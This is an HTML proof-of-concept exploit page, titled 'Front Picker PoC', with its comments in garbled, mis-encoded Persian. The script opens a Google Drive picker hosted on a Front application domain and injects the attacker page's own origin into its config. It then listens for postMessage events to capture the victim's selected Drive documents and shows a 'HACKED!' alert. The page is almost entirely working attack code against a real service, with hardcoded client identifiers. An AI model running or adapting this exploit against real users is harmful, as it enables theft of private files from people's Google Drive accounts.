<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Front Picker PoC - FINAL</title>
</head>
<body>
  <h2>ğŸ¯ Waiting for message...</h2>
  <pre id="output" style="background:#111;color:#0f0;padding:10px;white-space:pre-wrap;"></pre>

  <script>
    // Û±. Ù„ÛŒØ³Ù†Ø± Ø¨Ø§ÛŒØ¯ Ù‚Ø¨Ù„ Ø§Ø² Ù‡Ø± Ú†ÛŒØ²ÛŒ attach Ø¨Ø´Ù‡
    window.addEventListener("message", (e) => {
      console.log("ğŸ“¨ Raw Event:", e);
      
      const out = document.getElementById("output");
      out.textContent = "âœ… Message Received!\nOrigin: " + e.origin + "\n\nData:\n" + JSON.stringify(e.data, null, 2);
      
      if(e.data?.type === "google-documents-selected" && e.data.documents?.[0]) {
        out.textContent += "\n\nğŸ‰ SUCCESS! File: " + e.data.documents[0].name;
        alert("âœ… HACKED! Check console");
      }
    }, false);

    // Û². Ú©Ø§Ù†ÙÛŒÚ¯ ØªÙ…ÛŒØ² - Ù†Ú©ØªÙ‡ Ø­ÛŒØ§ØªÛŒ: origin Ø¨Ø§ÛŒØ¯ Ø¯Ù‚ÛŒÙ‚Ø§Ù‹ Ø¨Ø±Ø§Ø¨Ø± Ø¨Ø§ location.origin Ø¨Ø§Ø´Ù‡ (Ø¨Ø¯ÙˆÙ† ÙØ§ØµÙ„Ù‡)
    const myOrigin = window.location.origin; // Ø§ÛŒÙ† ÛŒØ¹Ù†ÛŒ "https://attacker.com" - Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø¯Ù‚ÛŒÙ‚
    console.log("ğŸ¯ My Origin:", myOrigin);

    const config = {
      googleAppId: "754490832836",
      googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly", // Ø¨Ø¯ÙˆÙ† ÙØ§ØµÙ„Ù‡
      googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
      origin: myOrigin // <<< Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù…ØªØºÛŒØ± Ø¯Ù‚ÛŒÙ‚ Ø¨Ù‡ Ø¬Ø§ÛŒ ØªØ§ÛŒÙ¾ Ø¯Ø³ØªÛŒ
    };

    // Û³. Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù¾Ø§Ù¾â€ŒØ¢Ù¾
    const baseUrl = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
    const fullUrl = `${baseUrl}?config=${encodeURIComponent(JSON.stringify(config))}`;
    
    console.log("ğŸ”— Opening URL:", fullUrl);
    const popup = window.open(fullUrl, "picker", "width=700,height=600");
    
    if(!popup) alert("âŒ Popup blocked! Please allow popups for this site.");
  </script>
</body>
</html>
